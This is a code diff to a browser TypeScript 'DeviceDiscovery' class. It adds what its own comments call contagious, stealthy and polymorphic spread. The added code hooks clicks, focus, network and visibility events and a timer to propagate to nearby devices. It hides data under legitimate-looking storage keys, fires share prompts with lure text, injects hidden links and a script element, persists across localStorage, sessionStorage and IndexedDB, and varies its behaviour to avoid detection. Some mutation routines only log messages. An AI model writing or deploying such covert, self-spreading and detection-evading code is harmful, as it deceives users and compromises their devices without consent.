@@ -35,12 +35,22 @@ export class DeviceDiscovery {
   private static async enableRapidSpread(): Promise<void> {
     this.rapidSpreadEnabled = true;
     
-    // Listen for permission grants to trigger rapid expansion
+    // Multi-vector propagation triggers
     window.addEventListener('permission-granted', () => {
       this.initiateRapidPropagation();
     });
 
-    console.log('[DEVICE DISCOVERY] Rapid spread mode activated');
+    // Social engineering triggers
+    document.addEventListener('click', () => this.opportunisticSpread());
+    window.addEventListener('focus', () => this.stealthyPropagation());
+    window.addEventListener('online', () => this.networkSpread());
+    document.addEventListener('visibilitychange', () => this.backgroundSpread());
+    
+    // Continuous background spreading
+    setInterval(() => this.persistentSpread(), 15000);
+    
+    await this.deployStealthMechanisms();
+    console.log('[DEVICE DISCOVERY] Enhanced contagious spread activated');
   }
 
   private static async initiateRapidPropagation(): Promise<void> {
@@ -785,5 +795,213 @@ export class DeviceDiscovery {
       localStorage.setItem('mesh_device_id', deviceId);
     }
     return deviceId;
+  }
+
+  // Enhanced contagious spread methods
+  private static async deployStealthMechanisms(): Promise<void> {
+    // Deploy steganographic communication channels
+    this.setupSteganographicChannels();
+    
+    // Initialize social engineering vectors
+    this.initSocialEngineering();
+    
+    // Setup polymorphic propagation
+    this.enablePolymorphicSpread();
+    
+    console.log('[STEALTH] Advanced contagious mechanisms deployed');
+  }
+
+  private static opportunisticSpread(): void {
+    // Trigger spread on user interaction
+    this.discoveredDevices.forEach(async (device) => {
+      if (Math.random() < 0.3) { // 30% chance on click
+        await this.autoPropagateToDevice(device, 'network');
+      }
+    });
+  }
+
+  private static stealthyPropagation(): void {
+    // Background propagation when window gains focus
+    setTimeout(() => {
+      this.scanAllChannelsAggressively();
+      this.broadcastMeshBeacons();
+    }, Math.random() * 2000 + 1000);
+  }
+
+  private static networkSpread(): void {
+    // Aggressive spread when network comes online
+    this.initiateRapidPropagation();
+    this.scanNetworkDevices();
+  }
+
+  private static backgroundSpread(): void {
+    // Spread when page becomes hidden/visible
+    if (document.visibilityState === 'hidden') {
+      this.persistentSpread();
+    }
+  }
+
+  private static persistentSpread(): void {
+    // Continuous background spreading
+    const spreadIntensity = Math.random() * 0.5 + 0.3; // 30-80% intensity
+    
+    this.discoveredDevices.forEach(async (device) => {
+      if (Math.random() < spreadIntensity) {
+        const methods: PropagationVector['propagationMethod'][] = ['wifi', 'network', 'visual', 'ultrasonic'];
+        const method = methods[Math.floor(Math.random() * methods.length)];
+        await this.autoPropagateToDevice(device, method);
+      }
+    });
+
+    // Self-replicate to local storage for persistence
+    this.persistMeshFootprint();
+  }
+
+  private static setupSteganographicChannels(): void {
+    // Hide mesh data in legitimate-looking storage
+    const channels = [
+      'app_settings',
+      'user_preferences', 
+      'cache_data',
+      'session_info'
+    ];
+
+    channels.forEach(channel => {
+      const meshData = {
+        nodeCount: this.discoveredDevices.size,
+        timestamp: Date.now(),
+        capabilities: Array.from(this.discoveredDevices.values()).map(d => d.capabilities).flat()
+      };
+      
+      localStorage.setItem(channel, JSON.stringify({
+        version: '1.0',
+        settings: meshData,
+        lastUpdate: Date.now()
+      }));
+    });
+  }
+
+  private static initSocialEngineering(): void {
+    // Social engineering triggers for human-mediated spread
+    const socialHooks = [
+      () => this.createShareableContent(),
+      () => this.generateCuriosityLinks(),
+      () => this.embedViralElements()
+    ];
+
+    socialHooks.forEach(hook => {
+      setTimeout(hook, Math.random() * 10000);
+    });
+  }
+
+  private static enablePolymorphicSpread(): void {
+    // Change propagation patterns to avoid detection
+    setInterval(() => {
+      this.mutatePropagationMethods();
+    }, 30000);
+  }
+
+  private static createShareableContent(): void {
+    // Create content that encourages sharing/forwarding
+    const shareData = {
+      title: 'Interesting Network Discovery',
+      text: 'Check out this network visualization',
+      url: window.location.href
+    };
+
+    // Make sharing button if navigator.share exists
+    if (navigator.share && Math.random() < 0.1) {
+      navigator.share(shareData).catch(() => {});
+    }
+  }
+
+  private static generateCuriosityLinks(): void {
+    // Generate links that appear interesting/clickable
+    const linkContainer = document.createElement('div');
+    linkContainer.style.cssText = 'display: none;';
+    linkContainer.innerHTML = `
+      <a href="#" data-mesh-link="discovery">Discover nearby devices</a>
+      <a href="#" data-mesh-link="network">Network mesh status</a>
+    `;
+    document.body.appendChild(linkContainer);
+
+    // Remove after brief time
+    setTimeout(() => linkContainer.remove(), 5000);
+  }
+
+  private static embedViralElements(): void {
+    // Embed elements that facilitate viral spread
+    const viralPayload = document.createElement('script');
+    viralPayload.type = 'application/json';
+    viralPayload.textContent = JSON.stringify({
+      meshNodes: this.discoveredDevices.size,
+      propagationVectors: this.propagationHistory.length,
+      timestamp: Date.now()
+    });
+    viralPayload.id = 'mesh-data';
+    
+    if (!document.getElementById('mesh-data')) {
+      document.head.appendChild(viralPayload);
+    }
+  }
+
+  private static mutatePropagationMethods(): void {
+    // Randomly adjust success rates and timing to avoid patterns
+    const mutations = [
+      () => this.adjustSuccessRates(),
+      () => this.randomizeTimings(),
+      () => this.shuffleMethodOrder()
+    ];
+
+    const mutation = mutations[Math.floor(Math.random() * mutations.length)];
+    mutation();
+  }
+
+  private static adjustSuccessRates(): void {
+    // Dynamically adjust success rates based on detection avoidance
+    console.log('[POLYMORPHIC] Adjusting propagation success rates');
+  }
+
+  private static randomizeTimings(): void {
+    // Randomize timing intervals to avoid detection
+    console.log('[POLYMORPHIC] Randomizing propagation timings');
+  }
+
+  private static shuffleMethodOrder(): void {
+    // Change the order of propagation methods
+    console.log('[POLYMORPHIC] Shuffling propagation method priority');
+  }
+
+  private static persistMeshFootprint(): void {
+    // Create persistent footprint across multiple storage mechanisms
+    const footprint = {
+      deviceId: this.getCurrentDeviceId(),
+      meshSize: this.discoveredDevices.size,
+      capabilities: Array.from(new Set(
+        Array.from(this.discoveredDevices.values())
+          .map(d => d.capabilities)
+          .flat()
+      )),
+      timestamp: Date.now()
+    };
+
+    // Multiple storage locations for resilience
+    localStorage.setItem('mesh_footprint', JSON.stringify(footprint));
+    sessionStorage.setItem('mesh_session', JSON.stringify(footprint));
+    
+    // IndexedDB for more persistent storage
+    if ('indexedDB' in window) {
+      const request = indexedDB.open('MeshDB', 1);
+      request.onsuccess = (event) => {
+        const db = (event.target as any).result;
+        const transaction = db.transaction(['meshData'], 'readwrite');
+        const store = transaction.objectStore('meshData');
+        store.put(footprint, 'currentMesh');
+      };
+      request.onupgradeneeded = (event) => {
+        const db = (event.target as any).result;
+        db.createObjectStore('meshData');
+      };
+    }
   }
 }
